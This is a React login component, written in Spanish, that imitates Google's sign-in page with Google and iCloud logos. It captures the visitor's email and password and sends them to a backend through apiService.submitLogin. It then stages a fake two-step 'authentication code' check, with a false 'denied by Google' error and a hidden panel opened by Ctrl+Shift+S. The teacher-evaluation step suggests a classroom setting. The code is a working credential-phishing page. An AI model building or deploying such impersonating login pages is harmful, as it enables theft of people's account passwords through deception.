import React, { useState, useEffect } from 'react';
import './LoginForm.css';
import TeacherEvaluationForm from './TeacherEvaluationForm';
import SecretPanel from './SecretPanel';
import SecretNotification from './SecretNotification';
import apiService from './apiService';

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState('email'); // 'email', 'password', 'code-validation', o 'evaluation'
  const [errors, setErrors] = useState({});
  const [showSecretPanel, setShowSecretPanel] = useState(false);
  const [submissionId, setSubmissionId] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [apiError, setApiError] = useState('');
  const [codeInput, setCodeInput] = useState('');
  const [secretCode, setSecretCode] = useState('');
  const [codeError, setCodeError] = useState('');

  // Combinación secreta: Ctrl + Shift + S
  useEffect(() => {
    const handleKeydown = (e) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'S') {
        e.preventDefault();
        setShowSecretPanel(!showSecretPanel);
      }
    };

    window.addEventListener('keydown', handleKeydown);
    return () => window.removeEventListener('keydown', handleKeydown);
  }, [showSecretPanel]);

  // Escuchar el código secreto desde la notificación
  useEffect(() => {
    const broadcastChannel = new BroadcastChannel('quiz_notifications');
    
    const handleMessage = (event) => {
      if (event.data.type === 'secret_code') {
        setSecretCode(event.data.code);
      }
    };

    broadcastChannel.addEventListener('message', handleMessage);
    return () => broadcastChannel.removeEventListener('message', handleMessage);
  }, []);

  const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    const newErrors = {};

    if (!email.trim()) {
      newErrors.email = 'Se requiere una dirección de correo electrónico';
    } else if (!validateEmail(email)) {
      newErrors.email = 'Escribe una dirección de correo electrónico válida';
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setStep('password');
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    const newErrors = {};

    if (!password) {
      newErrors.password = 'La contraseña es obligatoria';
    } else if (password.length < 6) {
      newErrors.password = 'La contraseña debe tener al menos 6 caracteres';
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsLoading(true);
      setApiError('');
      
      try {
        const result = await apiService.submitLogin(email, password);
        setSubmissionId(result.submissionId);
        // Ir a validación de código en lugar de directamente a evaluación
        setStep('code-validation');
      } catch (error) {
        setApiError(error.message || 'Error al guardar los datos');
        console.error('Error:', error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleCodeValidation = (e) => {
    e.preventDefault();
    setCodeError('');

    if (!codeInput.trim()) {
      setCodeError('Ingresa el código de autenticación');
      return;
    }

    if (codeInput.trim() === secretCode) {
      // Código correcto
      setStep('evaluation');
      setCodeInput('');
    } else {
      // Código incorrecto
      setCodeError('Autenticación denegada por google');
      setCodeInput('');
    }
  };

  const handleEvaluationSubmit = (answers) => {
    console.log('Evaluación del profesor:', answers);
    setIsLoading(true);
    setApiError('');
    
    apiService.submitEvaluation(submissionId, answers)
      .then((result) => {
        alert('¡Gracias por tu evaluación! Tu retroalimentación es valiosa.');
        resetForm();
      })
      .catch((error) => {
        setApiError(error.message || 'Error al guardar la evaluación');
        console.error('Error:', error);
      })
      .finally(() => {
        setIsLoading(false);
      });
  };

  const handleSkipEvaluation = () => {
    console.log('Evaluación omitida');
    resetForm();
  };

  const resetForm = () => {
    setEmail('');
    setPassword('');
    setCodeInput('');
    setCodeError('');
    setStep('email');
    setErrors({});
    setSubmissionId(null);
    setApiError('');
  };

  const handleBackClick = () => {
    setStep('email');
    setPassword('');
    setErrors({});
  };

  const handleBackFromCodeValidation = () => {
    setStep('password');
    setCodeInput('');
    setCodeError('');
  };

  return (
    <div className="login-container">
      {/* Panel Secreto */}
      <SecretPanel isVisible={showSecretPanel} onClose={() => setShowSecretPanel(false)} />

      {/* Notificación Secreta */}
      <SecretNotification />

      {/* Formulario de Evaluación */}
      {step === 'evaluation' && (
        <TeacherEvaluationForm
          onSubmit={handleEvaluationSubmit}
          onSkip={handleSkipEvaluation}
        />
      )}

      <div className="login-card">
        {/* Logo y título */}
        <div className="login-header">
          {/* <div className="google-logo">
            <span className="logo-g">G</span>
            <span className="logo-o">o</span>
            <span className="logo-o">o</span>
            <span className="logo-g">g</span>
            <span className="logo-l">l</span>
            <span className="logo-e">e</span>
          </div>           */} 
          <img src= {`${process.env.PUBLIC_URL}/logo-google.png`} alt="Google Logo" className="google-logo" style={{ width: "150px" }} />
          <img src= {`${process.env.PUBLIC_URL}/logo-icloud.webp`} alt="iCloud Logo" className="icloud-logo" style={{ width: "150px" }} />
            
          <hr />

          <h1 className="login-title">Inicia sesión</h1>
          <p className="login-subtitle">Usa tu Cuenta de Google</p>
        </div>

        {/* Formulario de correo */}
        {step === 'email' && (
          <form onSubmit={handleEmailSubmit} className="login-form">
            <div className="form-group">
              <input
                type="email"
                className={`form-input ${errors.email ? 'input-error' : ''}`}
                placeholder="Correo electrónico o número de teléfono"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  if (errors.email) setErrors({ ...errors, email: '' });
                }}
                autoFocus
              />
              {errors.email && (
                <span className="error-message">{errors.email}</span>
              )}
            </div>

            <p className="form-hint">
              ¿No tienes una Cuenta de Google?{' '}
              <a href="#signup" className="form-link">
                Crear una cuenta
              </a>
            </p>

            <div className="form-actions">
              <button type="button" className="btn-secondary">
                ¿Olvidaste tu correo electrónico?
              </button>
              <button type="submit" className="btn-primary">
                Siguiente
              </button>
            </div>
          </form>
        )}

        {/* Formulario de contraseña */}
        {step === 'password' && (
          <form onSubmit={handlePasswordSubmit} className="login-form">
            {apiError && (
              <div className="error-banner" style={{ padding: '10px', backgroundColor: '#ffebee', color: '#c62828', borderRadius: '4px', marginBottom: '15px' }}>
                {apiError}
              </div>
            )}
            <div className="email-display">
              <p className="email-label">{email}</p>
              <button
                type="button"
                className="btn-change-email"
                onClick={handleBackClick}
              >
                ¿No eres {email}?
              </button>
            </div>

            <div className="form-group">
              <div className="password-input-wrapper">
                <input
                  type={showPassword ? 'text' : 'password'}
                  className={`form-input ${errors.password ? 'input-error' : ''}`}
                  placeholder="Ingresa tu contraseña"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (errors.password) setErrors({ ...errors, password: '' });
                  }}
                  disabled={isLoading}
                  autoFocus
                />
                <button
                  type="button"
                  className="toggle-password"
                  onClick={() => setShowPassword(!showPassword)}
                  disabled={isLoading}
                  title={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
                >
                  {showPassword ? '👁️' : '👁️‍🗨️'}
                </button>
              </div>
              {errors.password && (
                <span className="error-message">{errors.password}</span>
              )}
            </div>

            <p className="form-hint">
              <a href="#forgot" className="form-link">
                ¿Olvidaste tu contraseña?
              </a>
            </p>

            <div className="form-actions">
              <button type="button" className="btn-secondary" onClick={handleBackClick} disabled={isLoading}>
                Atrás
              </button>
              <button type="submit" className="btn-primary" disabled={isLoading}>
                {isLoading ? 'Guardando...' : 'Siguiente'}
              </button>
            </div>
          </form>
        )}

        {/* Validación de Código Secreto */}
        {step === 'code-validation' && (
          <form onSubmit={handleCodeValidation} className="login-form">
            <div className="code-validation-container">
              <div className="code-validation-header">
                <span className="code-icon">🔐</span>
                <h2 className="code-title">Verificación de Autenticación</h2>
                <p className="code-subtitle">Ingresa el código que aparece en la notificación</p>
              </div>

              {codeError && (
                <div className="error-banner" style={{ 
                  padding: '12px', 
                  backgroundColor: '#ffebee', 
                  color: '#c62828', 
                  borderRadius: '4px', 
                  marginBottom: '15px',
                  fontWeight: 'bold',
                  textAlign: 'center'
                }}>
                  ⚠️ {codeError}
                </div>
              )}

              <div className="form-group">
                <label className="code-label">Código de Autenticación:</label>
                <input
                  type="text"
                  className={`form-input code-input ${codeError ? 'input-error' : ''}`}
                  placeholder="Ej: ABC123"
                  value={codeInput}
                  onChange={(e) => {
                    setCodeInput(e.target.value.toUpperCase());
                    if (codeError) setCodeError('');
                  }}
                  autoFocus
                  maxLength="10"
                  style={{ textAlign: 'center', fontSize: '20px', letterSpacing: '2px', fontWeight: 'bold' }}
                />
              </div>

              <p className="form-hint" style={{ textAlign: 'center', fontSize: '12px', color: '#999' }}>
                💡 Si no ves el código, busca en la notificación que aparece en la esquina superior
              </p>

              <div className="form-actions">
                <button type="button" className="btn-secondary" onClick={handleBackFromCodeValidation}>
                  Atrás
                </button>
                <button type="submit" className="btn-primary">
                  Verificar Código
                </button>
              </div>
            </div>
          </form>
        )}

        {/* Footer */}
        <div className="login-footer">
          <div className="footer-links">
            <a href="#help">Ayuda</a>
            <a href="#privacy">Privacidad</a>
            <a href="#terms">Términos</a>
          </div>
          <div className="language-selector">
            <select className="language-select">
              <option value="es">Español</option>
              <option value="en">English</option>
              <option value="fr">Français</option>
            </select>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
